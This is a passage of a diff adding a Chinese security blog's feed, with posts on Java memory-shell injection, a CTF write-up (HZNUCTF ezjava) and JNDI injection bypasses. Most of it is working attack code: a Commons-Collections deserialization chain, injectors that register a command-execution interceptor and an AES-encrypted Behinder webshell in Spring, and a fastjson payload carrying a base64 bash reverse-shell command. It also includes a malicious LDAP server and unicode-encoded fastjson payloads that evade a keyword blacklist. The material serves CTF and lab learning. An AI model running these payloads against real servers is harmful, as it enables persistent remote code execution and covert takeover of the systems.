+                    k = this.behinderShellPwd;
+                    session.setAttribute(&quot;u&quot;, k);
+                    cipher = Cipher.getInstance(&quot;AES&quot;);
+                    cipher.init(2, new SecretKeySpec((session.getAttribute(&quot;u&quot;) + &quot;&quot;).getBytes(), &quot;AES&quot;));
+                    byte[] evilClassBytes = cipher.doFinal((new BASE64Decoder()).decodeBuffer(request.getReader().readLine()));// base64解码+AES解密
+                    Method defineClass = Class.forName(&quot;java.lang.ClassLoader&quot;).getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);
+                    defineClass.setAccessible(true);
+                    Class evilClass = (Class) defineClass.invoke(this.getClass().getClassLoader(), evilClassBytes, 0, evilClassBytes.length);
+                    evilClass.newInstance().equals(pageContext);
+                    //System.out.println(&quot;QiuYYDS&quot;);
+                    return false;
+                }
+</code></pre>
+<p>然后就是编译然后base64接着替换掉原先的codeClass</p>
+<h1 id="效果">效果</h1>
+<p>原工具打能打通，有cmd的回显但是冰蝎的🐎是连接不上的<br>
+<img src="https://sl3epf.github.io/post-images/1703948603124.png" alt="" loading="lazy"><br>
+改造后<br>
+<img src="https://sl3epf.github.io/post-images/1703949449565.png" alt="" loading="lazy"><br>
+注意，如果你是用我这篇文章的靶场环境，在连接的时候是需要添加cookie参数的。</p>
+<h1 id="总结">总结</h1>
+<p>根据此思路也可以再修改其他的🐎，这次我只是遇到了他不支持spring的冰蝎。tomcat的可以用TomcatMemshell3，这个是支持我们平常用的冰蝎客户端的。<br>
+当然你也可以二改冰蝎去适配jndi工具，我觉得比较麻烦。<br>
+详情可见希谭实验室的文章 https://mp.weixin.qq.com/s/qE_AArdpAVL-EoBbILb_Jg</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[内存马小记]]></title>
+        <id>https://sl3epf.github.io/post/iXD_sv0an/</id>
+        <link href="https://sl3epf.github.io/post/iXD_sv0an/">
+        </link>
+        <updated>2023-12-29T02:56:59.000Z</updated>
+        <content type="html"><![CDATA[<!-- more -->
+<h1 id="前言">前言</h1>
+<p>记录一下利用CC链或者fastjson等打内存马的一些坑点，以及注入冰蝎的内存马。<br>
+不是调试分析的文章（这个自己做本地差不多了，感觉网上大部分都差不多，不想搞得很大的篇幅，明白什么interceptor在哪里加入的，程序是如何到达controller层的，调用什么方法注册controller路由的等等。能看懂代码知道哪几行是获取什么，恶意类在那个地方注入的。)<br>
+做个记录方便以后操作。</p>
+<h1 id="环境">环境</h1>
+<p>方便起见直接用SpringBoot了</p>
+<pre><code class="language-java">  &lt;parent&gt;
+    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+    &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
+    &lt;version&gt;2.4.5&lt;/version&gt;
+    &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;
+  &lt;/parent&gt;
+
+    &lt;dependency&gt;
+      &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+      &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+      &lt;version&gt;3.2.1&lt;/version&gt;
+    &lt;/dependency&gt;
+
+    &lt;dependency&gt;
+      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+      &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
+    &lt;/dependency&gt;
+
+  &lt;/dependencies&gt;
+&lt;/project&gt;
+</code></pre>
+<p>漏洞点</p>
+<pre><code class="language-java">@RestController
+public class VulController {
+    @RequestMapping(&quot;/vul&quot;)
+    @ResponseBody
+    public String vul(HttpServletRequest request, HttpServletResponse response, String payload) throws IOException, ClassNotFoundException {
+        if (payload != null) {
+            System.out.println(payload);
+            byte[] decode = Base64.getDecoder().decode(payload);
+            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(decode);
+            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
+            objectInputStream.readObject();
+            return &quot;attack success&quot;;
+        }
+        return &quot;payload null&quot;;
+    }
+}
+</code></pre>
+<h1 id="interceptor内存马利用">Interceptor内存马利用</h1>
+<h2 id="一-准备">一、准备</h2>
+<p>我们知道，将自定义的Interceptor类加入到RequestMappingHandlerMapping类的adaptedInterceptors属性中即可注册一个拦截器。<br>
+如下</p>
+<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.springframework.web.context.WebApplicationContext;
+import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.servlet.handler.AbstractHandlerMapping;
+import java.lang.reflect.Field;
+
+public class InterMemShell extends AbstractTranslet {
+    static {
+        try
+        {
+            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
+            AbstractHandlerMapping abstractHandlerMapping = context.getBean(AbstractHandlerMapping.class);
+            Field field = null;
+
+            field = AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);
+
+            field.setAccessible(true);
+            java.util.ArrayList&lt;Object&gt; adaptedInterceptors = null;
+
+            adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);
+
+            String className = &quot;magicInterceptor&quot;;
+            //加载magicInterceptor类的字节码
+            String b64 = &quot;base64 class&quot;;
+            byte[] bytes = sun.misc.BASE64Decoder.class.newInstance().decodeBuffer(b64);
+            java.lang.ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+            java.lang.reflect.Method m0 = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);
+            m0.setAccessible(true);
+            m0.invoke(classLoader, className, bytes, 0, bytes.length);
+            //添加com.example.spring.magicInterceptor类到adaptedInterceptors
+            adaptedInterceptors.add(classLoader.loadClass(className).newInstance());
+
+        } catch (Exception e){
+            e.printStackTrace();
+        }
+
+
+    }
+
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+</code></pre>
+<p>所以我们还需要一个类名为magicInterceptor(可以自定义，当然也要修改上面的className)的拦截器，重写preHandle方法。</p>
+<pre><code class="language-java">import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;
+
+import javax.crypto.Cipher;
+import javax.crypto.spec.SecretKeySpec;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import javax.servlet.http.HttpSession;
+import java.lang.reflect.Method;
+import java.util.HashMap;
+
+public class magicInterceptor extends HandlerInterceptorAdapter{
+    @Override
+    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
+       String code = request.getParameter(&quot;qiu&quot;);
+       if(code != null){
+           try {
+               java.io.PrintWriter writer = response.getWriter();
+               String o = &quot;&quot;;
+               ProcessBuilder p;
+               if(System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;)){
+                   p = new ProcessBuilder(new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, code});
+               }else{
+                   p = new ProcessBuilder(new String[]{&quot;/bin/sh&quot;, &quot;-c&quot;, code});
+               }
+               java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(&quot;\\\\A&quot;);
+               o = c.hasNext() ? c.next(): o;
+               c.close();
+               writer.write(o);
+               writer.flush();
+               writer.close();
+           }catch (Exception e){
+               e.printStackTrace();
+           }
+           return false;
+       }
+        return true;
+    }
+}
+</code></pre>
+<p>我这里利用CC3的LazyMap + TemplatesImpl链子打</p>
+<pre><code class="language-java">package Qiu;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.*;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC3 {
+    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {
+        TemplatesImpl templates = new TemplatesImpl();
+        Class templateClass = templates.getClass();
+        Field nameFiled = templateClass.getDeclaredField(&quot;_name&quot; );
+        nameFiled.setAccessible(true);
+        nameFiled.set(templates, &quot;qiuqiu&quot;);
+
+        Field bytecodesFiled = templateClass.getDeclaredField(&quot;_bytecodes&quot; );
+        bytecodesFiled.setAccessible(true);
+
+        byte[] code = Files.readAllBytes(Paths.get(&quot;xxx.class&quot;));
+        byte[][] codes = {code};
+        bytecodesFiled.set(templates, codes);
+
+        Field _tfField = templateClass.getDeclaredField(&quot;_tfactory&quot;);
+        _tfField.setAccessible(true);
+        _tfField.set(templates, new TransformerFactoryImpl());
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(templates),
+                new InvokerTransformer(&quot;newTransformer&quot;, null, null)};
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+        Map&lt;Object, Object&gt; Lazymap = LazyMap.decorate(map, chainedTransformer);
+
+        Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor&lt;?&gt; constructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(true);
+        InvocationHandler h = (InvocationHandler) constructor.newInstance(Override.class, Lazymap);
+
+        //一个类被动态代理了之后，想要通过代理调用这个类的方法，就一定会调用 invoke() 方法。
+        Map maproxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),// 传入ClassLoader
+                new Class[]{Map.class},// 传入要实现的接口
+                h);// 传入处理调用方法的InvocationHandler
+        Object o = constructor.newInstance(Override.class, maproxy);
+        serialize(o);
+        //unserialize(&quot;ser.bin&quot;);
+    }
+
+    public static void  serialize(Object obj) throws IOException {
+        ObjectOutputStream oos =new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+
+    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        return obj;
+    }
+}
+</code></pre>
+<p>再准备一个Base64编码的工具类，因为后面肯定需要对字节码进行编码传输</p>
+<pre><code class="language-java">package Qiu;
+
+import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
+
+public class B64Evil {
+    public static void main(String[] args) throws IOException {
+        byte[] code1 = Files.readAllBytes(Paths.get(&quot;magicInterceptor.class&quot;));
+        System.out.println(Base64.getEncoder().encodeToString(code1));
+        byte[] code = Files.readAllBytes(Paths.get(&quot;ser.bin&quot;));
+        System.out.println(Base64.getEncoder().encodeToString(code));
+    }
+}
+</code></pre>
+<h2 id="二-编译利用">二、编译利用</h2>
+<p>接下来就需要进行编译恶意类了。<br>
+有些文章说直接用idea编译的，但是idea编译是会自带那个package包名的，如果有这个最后利用的时候会报.NoClassDefFoundError的错，我也不知道是怎么利用成功的。<br>
+所以就得用javac编译，如果直接<code>javac xxx.java</code>会报一堆的错误，因为是找不到依赖的，所以需要利用cp参数。<br>
+这里放出我的命令，这里的jar包我全部放在当前文件夹了。版本的话自行测试。</p>
+<pre><code class="language-shell">javac -cp .:spring-web-4.3.28.RELEASE.jar:spring-webmvc-4.3.28.RELEASE.jar:javax.servlet-api-3.1.0.jar:spring-context-4.3.28.RELEASE.jar:spring-beans-4.3.28.RELEASE.jar:spring-core-4.3.28.RELEASE.jar InterMemShell.java
+</code></pre>
+<p>首先编译好<code>magicInterceptor</code>（也就是你重写preHandle方法的🐎）<br>
+然后对class进行base64编码，放入<code>InterMemShell</code>中，然后用同样的命令对<code>InterMemShell</code>进行编译<br>
+接着利用CC3序列化成ser.bin文件，然后对它进行base64编码打入，发包的时候需要url编码<br>
+<img src="https://sl3epf.github.io/post-images/1703832466325.jpg" alt="" loading="lazy"></p>
+<h2 id="三-注入冰蝎内存马">三、注入冰蝎内存马</h2>
+<p>先看看冰蝎的🐎</p>
+<pre><code class="language-jsp">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot; %&gt;
+    &lt;%!class U extends ClassLoader{
+        U(ClassLoader c){super(c);
+        }
+    public Class g(byte []b){
+        return super.defineClass(b,0,b.length);}
+    }%&gt;
+        &lt;%if (request.getMethod().equals(&quot;POST&quot;)){
+            String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
+            session.putValue(&quot;u&quot;,k);
+            Cipher c=Cipher.getInstance(&quot;AES&quot;);
+            c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));
+            new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
+        }
+        %&gt;
+</code></pre>
+<p>将之前的🐎替换为冰蝎的逻辑</p>
+<pre><code class="language-java">public class magicInterceptor extends HandlerInterceptorAdapter{
+    @Override
+    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
+        
+        HttpSession session = request.getSession();
+
+        HashMap pageContext = new HashMap();
+        pageContext.put(&quot;request&quot;,request);
+        pageContext.put(&quot;response&quot;,response);
+        pageContext.put(&quot;session&quot;,session);
+        try {
+            if (request.getMethod().equals(&quot;POST&quot;)) {
+                String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
+                session.putValue(&quot;u&quot;,k);
+                Cipher c=Cipher.getInstance(&quot;AES&quot;);
+                c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));
+                Method method = Class.forName(&quot;java.lang.ClassLoader&quot;).getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);
+                method.setAccessible(true);
+                byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
+                Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length);
+                evilclass.newInstance().equals(pageContext);
+            }
+        } catch (Exception e){
+            e.printStackTrace();
+        }
+
+        return true;
+    }
+}
+</code></pre>
+<p>同样的方法进行编译注入<br>
+<img src="https://sl3epf.github.io/post-images/1703837004015.jpg" alt="" loading="lazy"></p>
+<h1 id="controller内存马利用">Controller内存马利用</h1>
+<p>冰蝎逻辑🐎子</p>
+<pre><code class="language-java">import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.context.request.ServletRequestAttributes;
+
+import javax.crypto.Cipher;
+import javax.crypto.spec.SecretKeySpec;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import javax.servlet.http.HttpSession;
+import java.lang.reflect.Method;
+import java.util.HashMap;
+
+public class magicController {
+        public void shell() throws Exception {
+            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
+            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
+            HttpSession session = request.getSession();
+            //create pageContext
+            HashMap pageContext = new HashMap();
+            pageContext.put(&quot;request&quot;,request);
+            pageContext.put(&quot;response&quot;,response);
+            pageContext.put(&quot;session&quot;,session);
+            try {
+                if (request.getMethod().equals(&quot;POST&quot;)) {
+                    String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
+                    session.putValue(&quot;u&quot;,k);
+                    Cipher c=Cipher.getInstance(&quot;AES&quot;);
+                    c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));
+                    Method method = Class.forName(&quot;java.lang.ClassLoader&quot;).getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);
+                    method.setAccessible(true);
+                    byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
+                    Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length);
+                    evilclass.newInstance().equals(pageContext);
+                }
+            } catch (Exception e){
+                e.printStackTrace();
+            }
+        }
+}
+</code></pre>
+<p>注入恶意controller内存马</p>
+<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.springframework.web.context.WebApplicationContext;
+import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
+import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
+import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
+import java.lang.reflect.Method;
+
+
+public class ConMemShell extends AbstractTranslet {
+    static {
+        try {
+            String className = &quot;magicController&quot;;
+            //加载magicController类的字节码
+            String b64 = &quot;b64&quot;;
+            byte[] d = new sun.misc.BASE64Decoder().decodeBuffer(b64);
+            java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, new Class[]{String.class, byte[].class, int.class, int.class});
+            m.setAccessible(true);
+            m.invoke(Thread.currentThread().getContextClassLoader(), new Object[]{className, d, 0, d.length});
+            WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
+            PatternsRequestCondition url = new PatternsRequestCondition(&quot;/qiu&quot;);
+            RequestMappingInfo info = new RequestMappingInfo(url, null, null, null, null, null, null);
+            RequestMappingHandlerMapping rs = context.getBean(RequestMappingHandlerMapping.class);
+            Method mm = Class.forName(className).getMethod(&quot;shell&quot;);
+            rs.registerMapping(info, Class.forName(className).newInstance(), mm);
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+
+    }
+
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+
+}
+</code></pre>
+<p>同样利用CC3打注入，成功连接<br>
+<img src="https://sl3epf.github.io/post-images/1703862511248.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[HZNUCTF 2023 final]ezjava]]></title>
+        <id>https://sl3epf.github.io/post/TRjx_WdgE/</id>
+        <link href="https://sl3epf.github.io/post/TRjx_WdgE/">
+        </link>
+        <updated>2023-12-26T11:20:20.000Z</updated>
+        <content type="html"><![CDATA[<!-- more -->
+<h1 id="前言">前言</h1>
+<p>log4j2 + fastjson原生反序列化 + 高版本JNDI注入绕过<br>
+没有考那些绕过的tricks，这些环境实战也有挺多的，挺不错。</p>
+<h1 id="分析">分析</h1>
+<p>首先进题目就提示你<br>
+<img src="https://sl3epf.github.io/post-images/1703734647056.png" alt="" loading="lazy"><br>
+会记录我们在url上的参数，这里就可以想到一个log4j2的漏洞，我们尝试打一下发现能接收到dnslog请求<br>
+<img src="https://sl3epf.github.io/post-images/1703734721774.png" alt="" loading="lazy"><br>
+java版本是8u222，这个地方需要注意一下。<br>
+这里如果直接尝试利用log4j2弹shell是不可行的，这里具体不清楚是怎么实现的，可能是做了判断只剩下fastjson能够利用。<br>
+同样也提示了我们fastjson版本为1.2.48，可以利用1.2.48的exp打或者直接用1.2.83的全版本原生反序列化利用。<br>
+如下</p>
+<pre><code class="language-java">import com.alibaba.fastjson.JSONArray;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtConstructor;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.HashMap;
+
+public class FastNativeAll {
+    public static void setValue(Object obj, String name, Object value) throws Exception{
+        Field field = obj.getClass().getDeclaredField(name);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+    public static byte[] genPayload(String cmd) throws Exception{
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.makeClass(&quot;a&quot;);
+        CtClass superClass = pool.get(AbstractTranslet.class.getName());
+        clazz.setSuperclass(superClass);
+        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
+        constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;&quot;+cmd+&quot;\&quot;);&quot;);
+        clazz.addConstructor(constructor);
+        clazz.getClassFile().setMajorVersion(49);
+        return clazz.toBytecode();
+    }
+
+    public static void main(String[] args) throws Exception{
+
+
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+        setValue(templates, &quot;_bytecodes&quot;, new byte[][]{genPayload(&quot;bash -c {echo,base64编码payload}|{base64,-d}|{bash,-i}&quot;)});
+        setValue(templates, &quot;_name&quot;, &quot;qiu&quot;);
+        setValue(templates, &quot;_tfactory&quot;, null);
+
+        JSONArray jsonArray = new JSONArray();
+        jsonArray.add(templates);
+
+        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
+        setValue(bd,&quot;val&quot;,jsonArray);
+
+        HashMap hashMap = new HashMap();
+        hashMap.put(templates,bd);
+
+
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(hashMap);
+        objectOutputStream.close();
+        byte[] serialize = byteArrayOutputStream.toByteArray();
+        System.out.println(Base64.getEncoder().encodeToString(serialize));
+
+//        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
+//        objectInputStream.readObject();
+
+    }
+}
+</code></pre>
+<p>但是呢，如果这里直接起jndi服务打注入发现还是不可行的，因为我们之前dnslog探测过，这里使用的java版本是8u222是高于8u191的，这里就过不去远程codebase的检测限制，导致无法利用成功。<br>
+详情可以见上一篇文章。<br>
+然后我们就利用高版本ldap绕过起服务打</p>
+<pre><code class="language-java">package Qiu;
+import com.unboundid.ldap.listener.InMemoryDirectoryServer;
+import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+import com.unboundid.ldap.sdk.Entry;
+import com.unboundid.ldap.sdk.LDAPResult;
+import com.unboundid.ldap.sdk.ResultCode;
+import com.unboundid.util.Base64;
+import org.apache.commons.io.FileUtils;
+
+import javax.net.ServerSocketFactory;
+import javax.net.SocketFactory;
+import javax.net.ssl.SSLSocketFactory;
+import java.io.File;
+import java.io.IOException;
+import java.net.InetAddress;
+import java.net.URL;
+//高版本LDAP绕过
+
+public class LDAPServer {
+    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;
+
+    public static void main (String[] tmp_args ) throws Exception{
+        if (tmp_args.length &lt; 2) {
+            System.out.println(&quot;Usage: java xxx.jar &lt;IP&gt; &lt;file&gt;&quot;);
+            System.exit(1);
+        }
+
+        String ip = tmp_args[0];
+        String[] args = new String[]{&quot;http://&quot; + ip +&quot;/#Evail&quot;};
+        String payload = &quot;&quot;;
+        File file = new File(tmp_args[1]);
+        try {
+            payload = FileUtils.readFileToString(file);
+            System.out.println(payload);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+
+        int port = 6666;
+
+        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
+        config.setListenerConfigs(new InMemoryListenerConfig(
+                &quot;listen&quot;, //$NON-NLS-1$
+                InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$
+                port,
+                ServerSocketFactory.getDefault(),
+                SocketFactory.getDefault(),
+                (SSLSocketFactory) SSLSocketFactory.getDefault()));
+
+        config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ]), payload));
+        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
+        System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);
+        ds.startListening();
+    }
+
+    private static class OperationInterceptor extends InMemoryOperationInterceptor {
+
+        private URL codebase;
+        private String payload;
+
+        public OperationInterceptor ( URL cb , String payload) {
+            this.codebase = cb;
+            this.payload = payload;
+        }
+
+        @Override
+        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
+            String base = result.getRequest().getBaseDN();
+            Entry e = new Entry(base);
+            try {
+                sendResult(result, base, e, payload);
+            }
+            catch ( Exception e1 ) {
+                e1.printStackTrace();
+            }
+        }
+
+        protected void sendResult (InMemoryInterceptedSearchResult result, String base, Entry e , String payload) throws Exception {
+            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(&quot;.class&quot;));
+            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);
+            e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;);
+            String cbstring = this.codebase.toString();
+            int refPos = cbstring.indexOf('#');
+            if ( refPos &gt; 0 ) {
+                cbstring = cbstring.substring(0, refPos);
+            }
+
+            e.addAttribute(&quot;javaSerializedData&quot;, Base64.decode(payload));
+            result.sendSearchEntry(e);
+            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+        }
+    }
+}
+</code></pre>
+<p>这里为了方便使用，我改了一下，把ip和payload作为命令参数传入，将payload放入文件中读取，需要base64编码。也要注意最后不要多出换行或者空格，否则会导致解码失败。<br>
+编译成jar包后放到服务器上运行<br>
+<img src="https://sl3epf.github.io/post-images/1703735792897.png" alt="" loading="lazy"><br>
+接收到请求了，同时nc监听处也弹回了shell<br>
+<img src="https://sl3epf.github.io/post-images/1703735835994.jpg" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[JDK8u191版本后的JNDI注入绕过]]></title>
+        <id>https://sl3epf.github.io/post/jdk8u191hou-de-jndi-zhu-ru-rao-guo/</id>
+        <link href="https://sl3epf.github.io/post/jdk8u191hou-de-jndi-zhu-ru-rao-guo/">
+        </link>
+        <updated>2023-12-23T05:07:36.000Z</updated>
+        <content type="html"><![CDATA[<!-- more -->
+<h1 id="前言">前言</h1>
+<p>最近又看了下fastjson，想到之前某个比赛一道题，这两天又拿起来看了看。</p>
+<h1 id="分析">分析</h1>
+<p>首先看题目和依赖<br>
+<img src="https://sl3epf.github.io/post-images/1703308816770.jpg" alt="" loading="lazy"><br>
+<img src="https://sl3epf.github.io/post-images/1703308825351.jpg" alt="" loading="lazy"><br>
+第一眼就看到fastjson1.2.47，这个版本肯定是可以打的，就是通过反序列化往<code>mapping</code>中添加任何类，这样的话添加<code>com.sun.rowset.JdbcRoSetImpl</code>类，从而绕过<code>autoTypeSupport</code>的和黑名单的限制，然后再次传递json去触发<code>JdbcRowSetImpl</code>的JNDI注入。<br>
+其中可以发现它还有这些正则限制</p>
+<pre><code class="language-java">Pattern p = Pattern.compile(&quot;JdbcRowSetImpl|type|dataSourceName|autoCommit|TemplatesImpl|bytecodes|BasicDataSource&quot;, 8);
+        boolean isMatch = p.matcher(decode).find();
+        if (!isMatch)
+            try {
+                JSON.parse(decode);
+            } catch (Exception e) {
+                resp = &quot;Maybe Username or Password error!&quot;;
+            }
+</code></pre>
+<p>这个地方的话，我们可以知道Fastjson默认会去除键、值外的空格、<code>\b</code>、<code>\n</code>、<code>\r</code>、<code>\f</code>等，同时还会自动将键与值进行unicode与十六进制解码。<br>
+我们采用一个关键字编码绕过就可以</p>
+<pre><code class="language-java">{
+    &quot;1&quot;: {
+        &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.Class&quot;, 
+        &quot;val&quot;: &quot;com.sun.rowset.\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;
+    }, 
+    &quot;2&quot;: {
+        &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;com.sun.rowset.\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;, 
+        &quot;\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065&quot;: &quot;ldap://127.0.0.1:6666/Evail&quot;, 
+        &quot;\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074&quot;: true
+    }
+}
+</code></pre>
+<p>这个开始在本地打用jdk8u65低版本是没有问题的。<br>
+但是在远程打并不能通。于是最开始考虑是不是不出网<br>
+又考虑到了<code>Templates</code>链要开启<code>Feature.SupportNonPublicField</code>，<code>BCEL、c3p0、Commons-io</code>都是没有这个依赖的。<br>
+但是我们在题目中看到了这两个依赖</p>
+<pre><code>        &lt;dependency&gt;
+            &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
